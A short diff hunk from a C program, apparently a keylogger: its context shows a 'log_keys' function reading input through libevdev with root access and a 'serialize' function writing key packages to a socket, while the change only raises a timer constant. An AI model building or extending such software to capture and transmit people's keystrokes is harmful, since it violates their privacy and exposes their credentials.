@@ -195,7 +195,7 @@ int serialize(FILE* socket_file, key_package* packet) {
 
 void log_keys(key_package* package) {
   // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
-  int timer_counter = 20000000;
+  int timer_counter = 200000000;  // 20000000
 
   // open a device, as libevdev expects a file descriptor. You should have root
   // permissions
